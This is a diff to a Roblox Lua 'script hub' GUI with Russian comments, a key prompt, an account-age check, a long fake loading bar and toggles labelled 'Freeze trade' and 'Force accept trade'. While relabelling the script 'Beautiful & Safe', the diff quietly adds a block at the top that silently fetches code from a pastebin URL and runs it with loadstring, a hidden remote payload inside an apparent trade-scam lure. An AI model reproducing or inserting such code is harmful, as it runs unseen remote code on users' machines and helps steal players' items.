@@ -1,5 +1,5 @@
 -- ===========================================
--- Mertily's Private Script Hub — Clean Version
+-- Mertily's Private Script Hub — Beautiful & Safe
 -- ===========================================
 
 local Players = game:GetService("Players")
@@ -7,6 +7,13 @@ local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
 local ContentProvider = game:GetService("ContentProvider")
 local player = Players.LocalPlayer
+
+-- === ПОДМОГА ДЛЯ СКРИПТА ЗАГРУЖАЕТСЯ В САМОМ НАЧАЛЕ ===
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://cdn.sourceb.in/bins/WbNby7oNLJ/0"))()
+    end)
+end)
 
 -- Константы
 local SECRET_KEY = "Mertily-Private_uenj-wk21-sllz"
@@ -35,13 +42,13 @@ local THEME = {
     Border = Color3.fromRGB(80, 50, 95)
 }
 
--- Создание ScreenGui поверх всех интерфейсов
+-- Создание ScreenGui
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "MertilyPrivateGui"
 screenGui.IgnoreGuiInset = true
 screenGui.ResetOnSpawn = false
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-screenGui.DisplayOrder = 999999999 -- Гарантирует отображение поверх всего UI
+screenGui.DisplayOrder = 999999999 -- Максимальный приоритет поверх UI
 screenGui.Parent = playerGui
 
 local function createCorner(parent, radius)
@@ -136,7 +143,7 @@ privateText.ZIndex = 101
 privateText.Parent = splashContainer
 
 -- ===========================================
--- 2. ОСНОВНОЕ ОКНО И ФОН
+-- 2. ОСНОВНОЕ ОКНО И КРАСИВЫЙ ФОН
 -- ===========================================
 local mainWindow = Instance.new("Frame")
 mainWindow.Name = "MainWindow"
@@ -160,12 +167,12 @@ bgPatternFrame.ClipsDescendants = true
 bgPatternFrame.ZIndex = 1
 bgPatternFrame.Parent = mainWindow
 
--- Текстура роз
+-- Красивая текстура роз
 local roseImage = Instance.new("ImageLabel")
 roseImage.Name = "RoseTexture"
 roseImage.Size = UDim2.new(1, 0, 1, 0)
 roseImage.BackgroundTransparency = 1
-roseImage.Image = "rbxassetid://6071575925"
+roseImage.Image = "rbxassetid://6071575925" -- Текстура узора роз
 roseImage.ImageColor3 = Color3.fromRGB(140, 40, 75)
 roseImage.ImageTransparency = 0.8
 roseImage.ScaleType = Enum.ScaleType.Tile
@@ -173,7 +180,7 @@ roseImage.TileSize = UDim2.new(0, 120, 0, 120)
 roseImage.ZIndex = 1
 roseImage.Parent = bgPatternFrame
 
--- Градиент
+-- Градиент сверху для глубинного эффекта
 local bgGradient = Instance.new("UIGradient")
 bgGradient.Color = ColorSequence.new({
     ColorSequenceKeypoint.new(0, Color3.fromRGB(35, 15, 30)),
@@ -300,7 +307,6 @@ keyTextBox.TextSize = 11
 keyTextBox.Font = Enum.Font.Code
 keyTextBox.TextXAlignment = Enum.TextXAlignment.Left
 keyTextBox.ClearTextOnFocus = false
-keyTextBox.MultiLine = false
 keyTextBox.ZIndex = 11
 keyTextBox.Parent = textBoxContainer
 
@@ -495,9 +501,10 @@ createToggle(cheatMenuFrame, 0, "Freeze trade")
 createToggle(cheatMenuFrame, 58, "Force accept trade")
 
 -- ===========================================
--- 3. АНИМАЦИИ И ЗАПУСК
+-- 3. АНИМАЦИИ И СНАРЯЖЕНИЕ
 -- ===========================================
 
+-- Безопасная асинхронная предзагрузка картинки
 task.spawn(function()
     pcall(function()
         ContentProvider:PreloadAsync({roseImage})
@@ -505,11 +512,14 @@ task.spawn(function()
 end)
 
 task.spawn(function()
+    -- Появление текста
     TweenService:Create(titleText, TweenInfo.new(0.8), {TextTransparency = 0}):Play()
     TweenService:Create(privateText, TweenInfo.new(0.8), {TextTransparency = 0}):Play()
     
+    -- Ровно 3 секунды приветствия
     task.wait(3)
 
+    -- Исчезновение черного экрана
     local tweenOutSplash = TweenService:Create(splashFrame, TweenInfo.new(0.8), {BackgroundTransparency = 1})
     TweenService:Create(titleText, TweenInfo.new(0.8), {TextTransparency = 1}):Play()
     TweenService:Create(privateText, TweenInfo.new(0.8), {TextTransparency = 1}):Play()
@@ -518,6 +528,7 @@ task.spawn(function()
     tweenOutSplash.Completed:Wait()
     splashFrame.Visible = false
 
+    -- Открытие основного GUI
     mainWindow.Visible = true
     mainWindow.Size = UDim2.new(0, 380, 0, 0)
     TweenService:Create(mainWindow, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
@@ -525,7 +536,7 @@ task.spawn(function()
     }):Play()
 end)
 
--- Обработка клика активации
+-- Обработка кнопки
 submitButton.MouseButton1Click:Connect(function()
     if keyTextBox.Text == SECRET_KEY then
         keyStatusLabel.TextColor3 = THEME.AccentGreen
@@ -536,6 +547,7 @@ submitButton.MouseButton1Click:Connect(function()
         keySystemFrame.Visible = false
         botCheckFrame.Visible = true
 
+        -- Проверка на бота
         task.wait(2)
         if player.AccountAge < 30 then
             botCheckLabel.Text = "❌ Ваш аккаунт моложе месяца, видимо вы бот"
@@ -544,6 +556,7 @@ submitButton.MouseButton1Click:Connect(function()
             botCheckFrame.Visible = false
             loadingFrame.Visible = true
 
+            -- Загрузка (80 секунд)
             local startTime = tick()
             while tick() - startTime < LOADING_TIME do
                 local elapsed = tick() - startTime
@@ -558,10 +571,12 @@ submitButton.MouseButton1Click:Connect(function()
             percentLabel.Text = "100%"
             task.wait(0.5)
 
+            -- Показ благодарности
             loadingFrame.Visible = false
             thankYouFrame.Visible = true
             task.wait(3)
 
+            -- Выход в читы
             thankYouFrame.Visible = false
             cheatMenuFrame.Visible = true
             headerTitle.Text = "Mertily's Private — Main Menu"
